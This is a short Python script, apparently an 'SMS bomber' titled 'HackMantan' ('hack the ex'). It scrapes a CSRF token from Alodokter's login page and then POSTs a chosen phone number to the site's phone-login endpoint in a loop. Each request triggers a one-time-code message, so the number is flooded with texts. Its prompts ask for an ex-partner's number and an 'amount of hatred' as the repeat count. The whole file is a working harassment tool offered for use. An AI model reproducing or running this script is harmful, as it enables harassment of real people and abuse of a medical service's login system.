
import requests,os,sys,time
from bs4 import BeautifulSoup as BS

class docter:
	def __init__(self):
		self.ses=requests.Session()

	def alodoc(self,num):
		self.ses.headers.update({'referer':'https://www.alodokter.com/login-alodokter'})
		req1=self.ses.get('https://www.alodokter.com/login-alodokter')
		bs1=BS(req1.text,'html.parser')
		token=bs1.find('meta',{'name':'csrf-token'})['content']
#		print(token)

		head={
			'user-agent':'Mozilla/5.0 (Linux; Android 7.0; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36',
			'content-type':'application/json',
			'referer':'https://www.alodokter.com/login-alodokter',
			'accept':'application/json',
			'origin':'https://www.alodokter.com',
			'x-csrf-token':token
		}
		req2=self.ses.post('https://www.alodokter.com/login-with-phone-number',headers=head,json={"user":{"phone":num}})
#		print(req2.json())
		if req2.json()['status'] == 'success':
			print("[•] Berhasil")
		else:
			print("[-] Gagal")


while True:
	try:
		os.system('clear')
		print("""
		•~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~•
                ✓NamaHack:HackMantan
                ✓Pembuat:Samuel Chow
                ✓Nama Channel:Samuel Chow
                √Nama Pacar:HaFaRa
                ✓Petunjuk:Kalau Ada Tulisan Gagal Berarti Ganti Nomor Target Atau Tunggu Aja
                ✓Peringatan:Jangan Di Salah Gunakan Resiko Tanggung Sendiri Yak :V
                •~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~•
[ Pilih Serangan ]
1. Alodokter.com
	""")
		pil=int(input("> Pilih: "))
		print("="*25)
		num=input("[?] Nomor Mantan: ")
		lop=int(input("[?] JumlahKebencian: "))
		print()

		main=docter()
		if pil == 1:
			for i in range(lop):
				main.alodoc(num)
		else:
			print("?: Pilih Dengan Benar >;(!?")

		lgi=input("\n[?] Coba lagi (Y/n) ")
		if lgi.lower() == 'n':
			sys.exit('BYE BYE ANAK PUNGUT :V ')
	except Exception as Err:
		sys.exit(Err)
